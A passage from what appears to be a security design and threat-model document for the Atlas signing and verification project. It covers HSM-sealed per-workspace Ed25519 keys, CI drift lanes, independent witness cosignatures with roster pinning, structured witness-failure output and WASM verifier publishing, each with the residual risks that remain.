  secret in the clear. This is by design — dev/CI deployments are
  not production-tenant-bearing.
- **Production-readiness preflight is partial.** The HSM-first
  dispatch in `master_seed_loader` makes init failure fatal (no
  silent fallback to dev seed when the trio is set), which is the
  load-bearing audit guarantee. (V1.10–V1.11 noted a follow-up
  lint that would refuse to start when `ATLAS_PRODUCTION=1` was
  set without the HSM trio; **V1.12 obviated this** by removing
  the `ATLAS_PRODUCTION` env var from the gate logic entirely.
  An operator who still exports it sees no behaviour change and
  no warning — the var is silently ignored.)

---

## wave-3 — sealed per-workspace signer (V1.11 — in scope)

V1.10 wave 2 sealed the master seed but kept the per-tenant
Ed25519 scalar derived in-process via HKDF: every `sign` call
materialised the scalar in a `Zeroizing<[u8; 32]>` buffer, used
it to construct an `ed25519_dalek::SigningKey`, and zeroized on
drop. The scalar's lifetime in Atlas address space was bounded
to the `sign` call, but it was non-zero — a memory-disclosure
attack that captured the heap during a `sign` invocation could
in principle exfiltrate the per-tenant scalar. wave-3 closes
this residual: per-workspace Ed25519 keypairs are generated
inside the HSM via `CKM_EC_EDWARDS_KEY_PAIR_GEN`, persisted as
`Sensitive=true, Extractable=false, Derive=false`, and signing
routes through `CKM_EDDSA(Ed25519)`. Only the 64-byte signature
exits the device. No per-tenant secret bytes ever enter Atlas
address space when wave-3 is opted in.

- **Layered with wave-2:** `workspace_signer_loader_with_writer`
  in `crates/atlas-signer/src/workspace_signer.rs` dispatches
  three layers in priority order: (1) wave-3 sealed signer,
  activated by `ATLAS_HSM_WORKSPACE_SIGNER` truthy AND the HSM
  trio set; (2) wave-2 sealed-seed signer, activated by the trio
  alone; (3) dev signer, activated by `ATLAS_DEV_MASTER_SEED=1`.
  Every layer fails closed if its prerequisites are partial —
  wave-3 opted in with no trio refuses; trio set with the
  PKCS#11 module failing to open refuses; the dispatcher never
  silently downgrades to a weaker layer.
- **Explicit opt-in, not "trio implies wave-3":** wave-3 changes
  per-tenant pubkey derivation from HKDF-of-master-seed to
  HSM-native key generation. The pubkeys are NOT byte-equivalent
  to V1.10 wave-2. A V1.10 deployment that pinned per-tenant
  pubkeys in `PubkeyBundle.keys` would silently rotate every
  entry on first wave-3 sign if activation were automatic. The
  `ATLAS_HSM_WORKSPACE_SIGNER` env var is the operator's explicit
  acknowledgement of the rotation event; the operator is then
  responsible for running the bundle rotation ceremony in
  `docs/OPERATOR-RUNBOOK.md` §4 against every active workspace
  before flipping the flag in production.
- **`derive-key` is structurally refused under wave-3.** The
  binary's `run_derive_key_or_refuse` checks
  `ATLAS_HSM_WORKSPACE_SIGNER` directly (not via the dispatcher,
  to avoid opening a PKCS#11 session for a subcommand that
  exists only to export the scalar) and exits with code 2
  whenever wave-3 is opted in. There is no exportable form of
  the per-tenant scalar to export; refusing at the CLI surface
  rather than letting the operator discover the unexportability
  later is the V1.10 fail-closed pattern preserved into V1.11.
- **Defence-in-depth via `CKA_DERIVE=false`.** PKCS#11 lets a
  base key with `CKA_DERIVE=true` serve as input to
  `C_DeriveKey` whose output may be exportable — an indirect
  way to leak material from a `Sensitive=true,
  Extractable=false` key. Some HSMs default to `CKA_DERIVE=true`
  on freshly-generated EC private keys; wave-3 pins
  `CKA_DERIVE=false` at generation time to slam that door shut.
- **Trust property — the env truth-table extends.** Auditors
  reviewing a deployment can request the env snapshot
  (`env | grep ATLAS_`) and conclude with certainty which layer
  is active: `ATLAS_HSM_WORKSPACE_SIGNER=1` + HSM trio set + the
  binary built with `--features hsm` is the wave-3 signature;
  trio set + opt-in unset is the wave-2 signature; neither is
  the dev signature. Partial trios refuse to start, so a
  contradictory snapshot is not possible at runtime.
- **wave-3 invariant tests:** `crates/atlas-signer/src/workspace_signer.rs`
  pins the dispatcher's three-layer dispatch order across multiple
  test scenarios: dev fallthrough, wave-2 fallthrough, wave-3
  routing, trio-missing refusal under wave-3 opt-in, partial-trio
  refusal under wave-3 opt-in, falsy-opt-in fallthrough, the
  truthy allow-list match (`1`/`true`/`yes`/`on`), the V1.12
  ignore semantics for `ATLAS_PRODUCTION` under wave-3 opt-in
  (the env var must not change wave-3 behaviour and must not
  appear in the refusal text), and the
  `derive-key`-refused-under-wave-3 trait contract. The phase-A determinism witnesses
  (`v1.11 wave-3 phase-a determinism witness`) lock the
  byte-equivalence of the dev wave-3 path to V1.10's
  HKDF-derived signatures — refactoring the trait surface
  cannot silently rotate keys for the dev/CI deployments that
  do NOT opt into wave-3.

### Residual risks after V1.11 wave-3

V1.11 wave-3 (HSM PKCS#11 per-workspace key sealing) has shipped.
The wave-2 residual risk *"per-tenant scalar transits Atlas
address space in a `Zeroizing` buffer"* is now mitigated **for
deployments that opt into wave-3 with the HSM trio set**;
wave-2 deployments (trio set, wave-3 opt-in unset) retain that
residual; dev/CI deployments running with
`ATLAS_DEV_MASTER_SEED=1` retain the V1.9-equivalent risk
profile.

- **wave-3 scope is "scalar inside HSM", not "tenant isolation
  inside HSM".** A single HSM token can hold per-workspace
  keypairs for many tenants under distinct
  `atlas-workspace-key-v1:<ws>` labels. An attacker with code
  execution **inside** atlas-signer can call
  `WorkspaceSigner::sign(workspace_id, msg)` against any
  `workspace_id` whose keypair has been generated on the token —
  PKCS#11's session-level access control does not split per
  CKA_LABEL. Per-workspace token isolation (one token per
  tenant, with a distinct PIN per token) is an operational tier
  outside V1.11's scope; the wave-3 trust property is "the
  scalar never enters Atlas address space", not "an attacker
  inside the signer cannot cross workspaces".
- **Multi-token redundancy is incompatible with wave-3.** wave-2
  supported "import the same master seed into multiple tokens",
  enabling cross-token redundancy without invalidating
  per-tenant pubkeys. wave-3 generates each keypair with the
  device's own entropy, so two tokens cannot agree on a
  per-workspace pubkey without exporting (which `Extractable=false`
  forbids). Deployments requiring redundancy must either stay on
  wave-2 OR accept that a fresh provision (= every per-tenant
  pubkey rotates) is the recovery path. `docs/OPERATOR-RUNBOOK.md`
  §3 documents this trade-off explicitly so it cannot be missed
  at deployment time.
- **Token loss under wave-3 invalidates more than wave-2.** Under
  wave-2 a fresh token can re-import the original sealed seed
  and re-derive the same per-tenant pubkeys (HKDF is
  deterministic). Under wave-3 a fresh token generates fresh
  keypairs; the V1.11 deployment that loses its wave-3 token
  invalidates every per-tenant pubkey across every workspace
  with no recovery path that preserves them. Operators who
  cannot accept this trade-off should stay on wave-2; the
  wave-3 dispatcher's opt-in flag is the load-bearing
  acknowledgement.
- **TOCTOU on the PKCS#11 module path is unchanged.** wave-3
  opens the same `dlopen(3)` path as wave-2; the V1.10
  absolute-path guard fires at config-parse, but filesystem
  state at the absolute path is not held between parse and
  `Pkcs11::new`. Filesystem ACLs on `${ATLAS_HSM_PKCS11_LIB}`
  AND its parent directories remain a *required* operational
  control under wave-3 (see `docs/OPERATOR-RUNBOOK.md` §3
  threat model bullet, identical wording to §2's bullet).
- **HSM driver compromise is unchanged.** The PKCS#11 module
  runs in atlas-signer's address space and has full access to
  every per-tenant key in the session. Vendor module signing
  is the operational defence; wave-3 cannot mitigate this with
  in-process controls. wave-3's improvement is bounded to
  "memory-disclosure on the signer host no longer yields the
  per-tenant scalar"; an attacker who controls the cryptoki
  module at load time still controls what `C_Sign` does.
- **`ATLAS_PRODUCTION` removed in V1.12.** V1.11 L-8 added a
  deprecation warning when `ATLAS_PRODUCTION` was set under any
  layer (wave-3, wave-2, or dev), targeting V1.12 removal. **V1.12
  removed both the gate function and the warning entirely.** The
  env var is silently ignored from V1.12 onwards. Deployments that
  still export it see no behaviour change and no warning; the
  V1.10+ positive opt-in is now the sole dev-seed gate, and the
  HSM trio (wave-2 + wave-3) is the production audit signal.
  V1.11-issued deployment logs containing the deprecation warning
  text remain valid forensic artefacts; V1.12+ logs will not
  reference the var.

---

## CI lanes (V1.12 — in scope)

V1.12 Scope B promotes three CI lanes from manual-only
(`workflow_dispatch`) to auto-trigger on PR + push + schedule. The
lanes are operational defence-in-depth: each one converts a specific
class of silent drift into a red CI signal that an auditor or
reviewer cannot miss. The drift classes are exactly the
trust-property invariants this document enumerates above; the lanes
exist so a regression in any of them surfaces before downstream
forks consume an affected build.

- **`hsm-byte-equivalence`** (PR + push, paths-filtered to signer +
  trust-core changes). Imports the canonical 32-byte master seed
  into a throwaway SoftHSM2 token and proves the V1.10 wave-2
  in-token HKDF-SHA256 derivation is byte-identical to the
  host-side derivation across every workspace under test. A red
  here means the V1.10 sealed-seed trust property
  (host-derivation == HSM-derivation for `(seed, workspace_id)`) is
  no longer holding — wave-2 deployments switching from dev to
  HSM mode would silently emit different per-tenant pubkeys for
  the same logical tenant. Drift sources include cryptoki crate
  regressions on `Mechanism` payload serialisation and PKCS#11
  derive-mechanism semantics changes
  (CKM_SP800_108_COUNTER_KDF).
- **`hsm-wave3-smoke`** (PR + push, paths-filtered to signer +
  trust-core + verify-cli + MCP-server). Builds atlas-signer with
  `--features hsm`, generates per-workspace keypairs in a throwaway
  SoftHSM2 token via `CKM_EC_EDWARDS_KEY_PAIR_GEN`, signs three
  events + two anchors via `CKM_EDDSA`, and verifies the exported
  trace as VALID. A red here means the V1.11 wave-3 trust property
  (per-workspace scalar never enters Atlas address space; signatures
  verify against pubkeys advertised in the bundle) has regressed
  end-to-end. Drift sources include the V1.11 wave-3 dispatcher
  routing (HSM trio + opt-in must select sealed signer over wave-2
  + dev), the cryptoki Mechanism payload for `CKM_EDDSA(Ed25519)`,
  and verifier acceptance of wave-3-emitted Ed25519 signatures.
- **`sigstore-rekor-nightly`** (cron `0 6 * * *` UTC + `workflow_dispatch`).
  Submits anchor batches to live `rekor.sigstore.dev` and verifies
  the inclusion proofs against the pinned Sigstore log pubkey + the
  active shard roster. A red here means one of three upstream drifts
  has landed: (1) Sigstore Rekor v1 API surface change (response
  schema, error format, deprecation event); (2) Sigstore log-pubkey
  rotation — the pinned ECDSA P-256 key in
  `SIGSTORE_REKOR_V1_PEM` (and, where the rotation also adds a new
  shard, the tree-ID roster `SIGSTORE_REKOR_V1_TREE_IDS`) requires
  a coordinated update + crate-version bump per V1.7's boundary rule;
  (3) tree_id growth past V1.8's lossless-JSON precision-preservation
  guarantee. The lane is decoupled from PR triggers so a Sigstore
  outage cannot block PR turnaround; nightly cadence gives < 24h
  drift-detection latency without coupling the audit signal to
  live-API availability. Concurrency-grouped so a manual dispatch
  during an in-flight scheduled run cancels the older run rather
  than doubling the production-log footprint.

The trust-property invariants under test are documented inline in
each lane's workflow file header (`.github/workflows/`); the
operator-facing failure-handling sketches live in
`docs/OPERATOR-RUNBOOK.md` §8.

---

## wave-c — independent witness cosignature (V1.13 — in scope)

V1.13 introduces an independent witness cosignature primitive on top
of the V1.7 anchor chain. A witness is a third party (organisationally
independent from the issuer) who signs over `chain_head_for(batch)`
to attest "I observed the chain at this head." The verifier accepts
signatures only against the pinned `ATLAS_WITNESS_V1_ROSTER`
(genesis-empty in this version; populated via the wave-C-2
commissioning ceremony documented in
`docs/OPERATOR-RUNBOOK.md` §10).

The trust-property addition over V1.12: a forger producing a tampered
trace must now compromise NOT ONLY the issuer's signing key BUT ALSO
`require_witness_threshold` independent witness keys. With `M=2-of-N`
or higher, this materially raises forgery cost — a single
compromised key (issuer OR witness) is no longer sufficient.

### Wave-C-1 (lenient default) — what landed

- **Per-batch witness slot.** `AnchorBatch.witnesses:
  Vec<WitnessSig>` carries Ed25519 signatures over
  `ATLAS_WITNESS_DOMAIN || chain_head_for(batch).to_bytes()`. The
  domain prefix `b"atlas-witness-v1:"` is distinct from
  `ANCHOR_CHAIN_DOMAIN` so a chain-head cannot be replayed as a
  witness signing input or vice versa.
- **Pinned roster boundary.** `ATLAS_WITNESS_V1_ROSTER:
  &[(&str, [u8; 32])]` is `&'static`, baked into the trust-core
  crate at compile time. There is no JSON/env mechanism to add a
  witness at runtime — commissioning is a code-side change subject
  to the same source-control review path as a Sigstore log-pubkey
  rotation. A runtime knob would defeat the trust property.
- **Lenient evidence row.** Wave-C-1 surfaces a `witnesses` row in
  `VerifyOutcome.evidence`: failures (unknown kid, bad signature,
  duplicate kid) appear as `ok=false` with the per-failure
  breakdown rendered via `WitnessFailure::Display`, but DO NOT
  invalidate the trace. This lets operators commission and observe
  cosigners in lower environments before flipping strict mode in
  production.
- **Duplicate-kid defence.** The per-batch verifier
  (`verify_witnesses_against_roster`) runs a `BTreeMap<&str, usize>`
  pre-pass over the witness slice and rejects every occurrence of a
  repeated kid as a failure — none counted as verified. Without
  this, an issuer could satisfy a 3-of-3 quorum by attaching the
  same valid signature three times under one commissioned key.

### Wave-C-2 (strict mode) — what landed

- **Threshold flag.** `VerifyOptions.require_witness_threshold:
  usize` (with `0` as the lenient sentinel preserving wave-C-1
  behaviour) and `atlas-verify-cli --require-witness <N>` reject any
  trace whose chain-aggregated `verified` count is below the
  threshold. The check fires regardless of chain presence — a
  chain-less trace under `--require-witness 1` MUST fail because
  it cannot possibly carry witness coverage.
- **Cross-batch dedup.** `aggregate_witnesses_across_chain_with_roster`
  walks every batch and threads a `BTreeSet<String>` of
  already-verified kids. A kid that re-appears in a later batch
  surfaces as a `WitnessFailure` ("duplicate witness_kid across
  batches") WITHOUT incrementing the global verified count.
  Preserves M-of-N independence: one compromised witness key cannot
  satisfy threshold N by signing N batches.
- **`MAX_WITNESS_KID_LEN = 256`.** Wire-side `witness_kid` cap
  fires before any roster work; the rejection cost is constant in
  the input length. The shared `sanitize_kid_for_diagnostic` helper
  collapses oversized kids to `"<oversize: N bytes>"` placeholders
  at every site that copies the wire-side string into a
  `WitnessFailure`, so an attacker submitting a multi-megabyte kid
  cannot amplify log volume across the per-witness diagnostic + the
  lenient evidence row's `rendered.join("; ")`.
- **`ChainHeadHex` newtype** (`atlas-trust-core::anchor`). Strict
  64-char lowercase-hex constructor + `as_str` / `to_bytes` /
  `into_inner` / `Display`. Distinguishes "freshly recomputed head"
  (typed `ChainHeadHex`) from "wire-side string" (`String`) at
  function-signature granularity, removing a class of refactoring
  bug where a wire field could silently flow into a recomputed-head
  slot. `decode_chain_head` delegates to `ChainHeadHex::new` so the
  length+lowercase invariant has a single source of truth.
- **Structured failures.** `WitnessVerifyOutcome.failures:
  Vec<WitnessFailure>` (was `Vec<String>` in wave-C-1) carries the
  kid + a structured `TrustError`. `WitnessFailure.batch_index` is
  `pub(crate)` with a public getter — external callers of the
  per-batch verifier cannot misread the always-`None` field as
  meaningful, while the chain aggregator owns populating it.

### Trust property after wave-C-2

  `verified == count(distinct kids whose pubkey is in
   ATLAS_WITNESS_V1_ROSTER AND whose Ed25519-strict signature over
   ATLAS_WITNESS_DOMAIN || chain_head_bytes validates AND no other
   batch in the chain already attributed verification to that kid)`

Strict mode adds the invariant `verified >= require_witness_threshold`
as a hard reject. Lenient mode (`require_witness_threshold = 0`) is
the wave-C-1 default and surfaces the same `verified` count as
informational evidence without enforcement.

### Residual risks (V1.13)

- **Genesis-empty production roster.** Until commissioning lands,
  `ATLAS_WITNESS_V1_ROSTER` is empty and strict mode is operationally
  unreachable through `verify_trace_with`. The strict-mode passing
  path is exercised by unit tests in `verify.rs::tests` against a
  test roster (the `_with_roster` aggregator is `pub(crate)` for
  this purpose). This is intentional — wave-C-1 / C-2 ship the
  primitive; the operational rollout is a separate ceremony.
- **Witness-issuer collusion.** A witness colluding with the issuer
  defeats independence — the witness signs whatever head the issuer
  computes, regardless of whether the underlying events are honest.
  Mitigation is organisational (witnesses must be drawn from
  organisationally-independent parties with their own incentives to
  attest honestly), not cryptographic.
- **What strict mode does NOT cover.** Witness cosignature attests
  to chain-head observation, not to the per-event payload contents.
  An issuer with valid signing keys can still produce a trace whose
  events misrepresent reality; witnesses confirm only that the
  issuer is not retroactively rewriting what they previously
  published. The orthogonal defence — Sigstore Rekor anchoring of
  the bundle hash — covers the "issuer rewriting their own bundle"
  case (see V1.6+V1.7 sections above).
- **Witness key compromise.** A single compromised witness key
  cannot satisfy threshold N >= 2 alone (the cross-batch dedup
  ensures one kid contributes at most one verified signature across
  the entire chain). N=1 strict mode is essentially "any commissioned
  witness must sign" — useful as a deployment-readiness signal but
  not as a defence against witness compromise. Operators should
  start at N=1 to validate the commissioning ceremony, then raise.

---

## scope-i — HSM-backed witness (V1.14 — in scope)

V1.13 wave-C wired the witness signing path against a 32-byte
file-backed seed (`atlas-witness sign-chain-head --secret-file
<path>`). The seed lived on the witness operator's filesystem and
the scalar transited the witness binary's address space in a
`Zeroizing<[u8; 32]>` buffer for the lifetime of one sign call —
exposing the scalar to memory-disclosure attacks (heap dumps,
swap, core dumps, debugger attachments) on the witness host for
that window. V1.14 Scope I closes this residual exposure for
HSM-backed witness deployments by sealing the witness Ed25519
scalar inside a PKCS#11 token: signing routes through
`CKM_EDDSA(Ed25519)` with `Sensitive=true`, `Extractable=false`,
`Derive=false` on the private half. The scalar never enters
atlas-witness address space, even transiently — only the
ready-formed 64-byte signature exits the device.

### What landed in V1.14 Scope I

- **`Pkcs11Witness` impl.** A new
  [`Pkcs11Witness`](../crates/atlas-witness/src/hsm/pkcs11.rs)
  struct implementing the dyn-safe
  [`Witness`](../crates/atlas-witness/src/lib.rs) trait under
  `--features hsm`. Holds a long-lived authenticated PKCS#11
  session + the cached private-key handle behind a `Mutex` for
  thread-safety; signs via `CKM_EDDSA(Ed25519)` against the
  resolved sealed scalar.
- **Trust-domain separation env-var trio.** New
  `ATLAS_WITNESS_HSM_PKCS11_LIB` / `ATLAS_WITNESS_HSM_SLOT` /
  `ATLAS_WITNESS_HSM_PIN_FILE` (distinct from atlas-signer's
  `ATLAS_HSM_*`). Same parsing semantics as atlas-signer's HSM
  trio — absolute-path guards on module + PIN file, full-or-none
  partial-trio rejection, surrounding-whitespace tolerant.
- **On-token label namespace separation.** Witness keypairs sit
  under the `atlas-witness-key-v1:` prefix (distinct from
  atlas-signer's `atlas-workspace-key-v1:`). A misconfigured
  deployment that points both binaries at the same slot still
  cannot cross-resolve keys — the label namespaces are disjoint
  by construction.
- **No auto-generation.** `Pkcs11Witness::open` only **resolves**
  an existing keypair by `(CLASS=PRIVATE_KEY, KEY_TYPE=EC_EDWARDS,
  LABEL=atlas-witness-key-v1:<kid>)`; missing keypair fails with a
  `SigningFailed:` error pointing at OPERATOR-RUNBOOK §11.
  Generation is an operator action via `pkcs11-tool --keypairgen`.
  This is the load-bearing trust property — a witness that
  auto-generated keys could be made to sign on a fresh, unrostered
  keypair and silently bypass `ATLAS_WITNESS_V1_ROSTER`.
- **CLI mutual exclusion.** `atlas-witness sign-chain-head --hsm`
  and `atlas-witness sign-chain-head --secret-file <path>` form a
  clap `ArgGroup` with `required = true, multiple = false`. An
  invocation that passes neither, both, or any other combination
  fails at argument parse — before any IO or HSM access. This is
  structural rather than runtime enforcement: a future code edit
  cannot accidentally allow both backends to fire and produce
  divergent signatures from the same kid.
- **`extract-pubkey-hex` subcommand.** A new
  `atlas-witness extract-pubkey-hex --kid <kid>` subcommand
  retrieves the paired `CKO_PUBLIC_KEY` object's `CKA_EC_POINT`,
  unwraps the PKCS#11 v3.0 §10.10 DER OCTET STRING wrapper (also
  accepts the raw 32-byte form for vendors that deviate from
  spec), and prints the 64-char hex pubkey. Used in OPERATOR-RUNBOOK
  §11 step 5 as the hand-off step that feeds §10's roster pin.
- **Byte-equivalence integration test.** A new
  `hsm_witness_byte_equivalence` integration test imports a known
  seed into a SoftHSM2 token, opens the resulting keypair via
  `Pkcs11Witness::open`, and asserts that the HSM-produced
  signature matches a software-Ed25519 reference signature
  byte-for-byte. Pinned as a CI lane (`hsm-witness-smoke.yml`).
  Locks the property "the signing path is a function of the scalar
  and the chain head, independent of substrate" — V1.13 file-backed
  witnesses and V1.14 HSM-backed witnesses produce byte-identical
  sigs given the same scalar, so a deployment can mix both in one
  quorum and the verifier cannot tell them apart.

### Trust property (Scope I)

V1.14 Scope I strengthens the *substrate* in which the witness
scalar lives without changing the trust contract.
`ATLAS_WITNESS_V1_ROSTER` continues to pin (kid, pubkey) pairs;
the verifier accepts any signature that validates against a
rostered pubkey under `ATLAS_WITNESS_DOMAIN || chain_head_bytes`,
regardless of whether the witness backend was a file or an HSM.
Operators can migrate per-witness without coordinating a global
cutover — the verifier sees only the resulting signatures.

The `verified ==` formula from wave-C-2 above is unchanged.
Scope I changes only what an attacker who lands a memory-disclosure
exploit on the witness host can extract: under V1.13 file-backed,
they got the 32-byte scalar (full impersonation for the lifetime
of the rostered pubkey); under V1.14 HSM-backed, they get nothing
(the scalar is unreachable from the witness's address space). The
PIN file is reachable, but a stolen PIN without physical access to
the HSM only enables `C_Sign` calls *while the attacker still
holds the witness host* — recoverable by the operator restarting
the witness on clean infrastructure with a rotated PIN.

### Residual risks after V1.14 Scope I

- **HSM physical compromise.** An attacker with physical possession
  of the witness token AND the user PIN can call `C_Sign` against
  the witness key for the lifetime of that PIN. Mitigation matches
  V1.10 wave 2 / V1.11 wave-3: PIN file in tmpfs (cleared on reboot),
  SO PIN in a separate secret manager, rotate on suspected exposure.
- **Malicious code inside the witness process.** The PKCS#11
  session is held open for the lifetime of the binary; an attacker
  who achieves code execution **inside** atlas-witness can call
  `Pkcs11Witness::sign_chain_head` arbitrarily during that
  session's lifetime, signing whatever chain head they like. This
  is a strict equivalence — any chain head an attacker presents,
  the HSM signs. Mitigated by the V1.14 CLI's single-shot shape
  (`sign-chain-head` produces one sig, then exits) — no long-lived
  session exists in production unless an embedder explicitly holds
  the handle open.
- **TOCTOU on the PKCS#11 module path.** Same residual as V1.10
  wave 2 / V1.11 wave-3: the absolute-path guard fires at
  config-parse, but `dlopen(3)` is a separate syscall; an attacker
  with write access to the absolute path or a parent directory
  can swap the .so between checks. Filesystem ACLs on
  `${ATLAS_WITNESS_HSM_PKCS11_LIB}` AND its parent directories
  remain a *required* operational control.
- **HSM driver compromise.** The PKCS#11 module runs in
  atlas-witness's address space and has full access to the
  witness key in the session. Vendor module signing + filesystem
  ACLs are the defences; there is no in-process sandbox between
  cryptoki and the rest of the witness binary.
- **Witness-issuer collusion.** Unchanged from V1.13 wave-C. A
  witness colluding with the issuer defeats independence — Scope I
  changes the substrate of the witness's scalar but not the trust
  property that requires organisational independence between
  witness and issuer.
- **Single compromised witness scalar still meaningful at N=1.**
  Same as V1.13 wave-C-2 — strict mode at threshold N=1 is a
  deployment-readiness signal, not a defence against witness
  compromise. Operators should run at N >= 2 with witnesses drawn
  from organisationally-independent parties for any production
  deployment relying on witness attestation.

### What V1.14 Scope I does NOT cover

- **File-backed witness exposure remains unchanged.** Operators
  who continue with `--secret-file` retain the V1.13 memory-
  disclosure exposure on the witness host. V1.14 does not deprecate
  the file-backed path — small deployments without HSM access can
  continue using it; the trade-off is documented in
  OPERATOR-RUNBOOK §11.
- **Verifier-side roster mechanism.** §10 (the verifier-side
  commissioning ceremony) is unchanged. V1.14 Scope I produces
  pubkey hex for §10 to consume; §10 continues to pin
  `(kid, [u8; 32])` tuples into the trust-core source. A V1.14
  deployment whose witness operator runs §11 but whose verifier
  operator skips §10 produces witness signatures that land in
  evidence as "kid not in pinned roster" and do not count toward
  threshold — the same disposition as V1.13 with the same fix
  (run §10).
- **Bundle-rotation cadence or roster scaling.** Scope I changes
  per-witness substrate; it does not change how often rosters
  rotate or how many witnesses a deployment can pin. Both remain
  operator-deliberate code-side ceremonies.

---

## scope-j — auditor wire-surface (V1.14 — shipped)

V1.13 wave-C-2's witness diagnostics surfaced through a single JSON
field — the `evidence` row's `detail` string, with per-failure entries
joined by `; `. Auditor tooling that wanted to classify a failure
(distinguish a kid-not-in-roster failure from a duplicate-kid failure
from an invalid-signature failure) had to string-match against the
human-readable detail. That is fragile by design: a verifier-side
wording fix would silently break the auditor's classifier without
any compile-time signal. V1.14 Scope J replaces that with a structured
wire surface — `VerifyOutcome.witness_failures: Vec<WitnessFailureWire>`
in `serde_json` form — that auditors can consume programmatically.

### What landed in V1.14 Scope J

- **`WitnessFailureReason` enum.** A new
  [`WitnessFailureReason`](../crates/atlas-trust-core/src/witness.rs)
  in `atlas-trust-core` with nine kebab-case variants
  (`kid-not-in-roster`, `duplicate-kid`, `cross-batch-duplicate-kid`,
  `invalid-signature-format`, `invalid-signature-length`,
  `oversize-kid`, `chain-head-decode-failed`, `ed25519-verify-failed`,
  `other`). Marked `#[non_exhaustive]` so adding new failure modes in
  future verifier waves does not require auditor tooling to handle a
  new variant immediately — they can default to `other` until they
  update.
- **`WitnessFailureWire` struct.** A serde-stable projection of an
  internal `WitnessFailure` carrying `witness_kid: String`,
  `batch_index: Option<u64>`, `reason_code: WitnessFailureReason`, and
  the human-readable `message: String`. `#[serde(deny_unknown_fields)]`
  is set so a corrupted or extended JSON payload fails closed at parse
  rather than being silently ignored.
- **At-source classification.** `verify_witness_against_roster_categorized`
  (a new private helper) returns `Result<(), (TrustError, WitnessFailureReason)>`,
  letting the per-witness verifier name the failure reason at the
  point where the rejection happens — no fragile string-match needed
  upstream. The public `verify_witness_against_roster` continues to
  return `TrustResult<()>` so the existing API contract is preserved.
- **`VerifyOutcome.witness_failures` field.** Additive (with
  `#[serde(default)]` for backwards-compat with pre-J consumers
  that parse pre-J `VerifyOutcome` JSON). Populated in
  `verify_trace_with` by mapping `witness_aggregate.failures` through
  `WitnessFailureWire::from`. Empty when there are no witness
  failures (no chain, or chain without witnesses, or all witnesses
  verified).
- **Wire-side input sanitisation.** The per-batch verifier sanitises
  `witness_kid` via `sanitize_kid_for_diagnostic` *before*
  constructing any `WitnessFailure` record, including the
  duplicate-kid pre-pass branch that would previously have echoed
  the raw input. Defends the lenient evidence row's
  `rendered.join("; ")` aggregation from a multi-MB blob amplification
  attack where an attacker presents an oversize kid hoping to balloon
  the diagnostic output. The sanitisation is fixed-prefix
  truncation + length-tag suffix, so the wire payload is always
  bounded.
- **CLI wire pin.** `atlas-verify-cli verify-trace --output json`
  emits the `witness_failures` array as part of `VerifyOutcome`
  serialisation. Exercised end-to-end by
  `crates/atlas-verify-cli/tests/witness_failures_json.rs`
  (Rust integration test) and `apps/atlas-mcp-server/scripts/smoke.ts`
  step 8 (TS-side parse, JSON.parse round-trip). A regression that
  omits the field, renames it, or emits `null` instead of `[]` trips
  one or both tests.

### Trust property (Scope J)

V1.14 Scope J does NOT change the verification verdict for any input
that V1.13 wave-C-2 already accepted or rejected. `valid` and `errors`
remain the load-bearing trust signals; `witness_failures` is purely
diagnostic. A trace with `witness_failures: [{...}]` and `valid: true`
is the lenient-mode disposition (V1.13 wave-C-1: present but
unverified witnesses do not invalidate the trace); the same trace
under `--require-witness >= 1` would have `valid: false` with the
witnesses-threshold error in `errors`, and the `witness_failures`
array would be the same.

The strict-mode promotion path (V1.13 wave-C-2) is unchanged. Auditor
tooling that wants to reproduce a strict-mode verdict from JSON
output can ignore `witness_failures` entirely and key on `valid` +
`errors`. Tooling that wants to attribute *why* a strict-mode
threshold missed (e.g. "all five witnesses are uncommissioned" vs
"three witnesses verified, two failed signature") consumes
`witness_failures.iter().filter(|f| f.reason_code == ...)`.

### Residual risks after V1.14 Scope J

- **Auditor tooling switches on `reason_code` without `_default`
  branch.** `WitnessFailureReason` is `#[non_exhaustive]`. A v1.14
  auditor that exhaustively matches all known variants will fail
  closed against a future variant added in a v1.15 (or later)
  verifier — but the `valid` verdict still correctly tells them
  whether to reject the trace. Tooling MUST handle the catch-all
  `_` arm or coerce unknown variants to `other`. Documented in
  the rustdoc on `WitnessFailureReason`.
- **`message` field is human-readable, not a stable contract.**
  Auditor tooling that depends on the wording of `WitnessFailureWire.message`
  has the same fragility as pre-J string-matching against the
  evidence detail. The stable contract is `reason_code` +
  `witness_kid` + `batch_index`. `message` is for human eyeballs
  in CLI output and dashboard display; it is NOT pinned by tests
  and may be reworded between minor versions.
- **Schema additions are minor-version compatible only.**
  Pre-J auditor tooling that uses `serde_json::Value`-style
  parsing (instead of typed struct deserialisation) will see the
  new field and ignore it — backwards-compat works. But auditor
  tooling that uses a typed `VerifyOutcome` struct from a pre-J
  version of `atlas-trust-core` will fail to compile against a
  post-J trust-core (the field is added, not optional in the
  struct). Vendoring a specific trust-core version is the
  documented pattern.

### What V1.14 Scope J does NOT cover

- **Other evidence rows.** Scope J structures only the witness path.
  `event-signatures`, `anchor-chain`, `per-tenant-keys`, `anchors`,
  and `dag-tips` evidence rows still surface only as
  `(check, ok, detail)` tuples. Future scopes may extend the same
  pattern (`{check}_failures: Vec<{Check}FailureWire>`) but each is
  an independent wire commitment.
- **Strict-mode error wording.** The `errors` array's strings (e.g.
  "witnesses-threshold: 0 of 1 verified") remain wording-stable but
  not type-stable. Strict-mode-aware auditor tooling that wants to
  classify the strict-mode failure programmatically has no
  structured equivalent yet — Scope J intentionally scopes the
  structured surface to per-witness failures, where the
  classification grain is meaningful.
- **Backwards-decode of pre-J `VerifyOutcome` JSON.** The
  `#[serde(default)]` attribute lets pre-J payloads (without
  `witness_failures`) deserialise into a post-J struct (with
  `witness_failures: vec![]`). The reverse — a post-J consumer
  that drops `witness_failures` from a serialised post-J
  outcome — is not supported; the consumer must round-trip
  through a typed struct or explicitly strip the field.

---

## scope-e — WASM verifier publishing (V1.14 — shipped)

V1.13 wave-C through V1.14 Scope J shipped the verifier as a Rust
workspace artefact: `atlas-verify-cli` for native CLI use,
`atlas-verify-wasm` as an in-tree library compiled to
`wasm32-unknown-unknown` and embedded by `atlas-web`. Auditor tooling
that wanted to consume the verifier from JavaScript (browser, Node.js,
edge runtimes) had to clone the repo and run `wasm-pack build` itself.
V1.14 Scope E publishes the WASM build to npm under
`@atlas-trust/verify-wasm` so any auditor with `npm install` can
consume the byte-identical Rust verifier core in a single step.

### What landed in V1.14 Scope E

- **`wasm-publish.yml` CI lane.** `.github/workflows/wasm-publish.yml`
  builds `crates/atlas-verify-wasm` for both `--target web` (browser
  ESM) and `--target nodejs` (CommonJS) on every tag push (`v*`) and
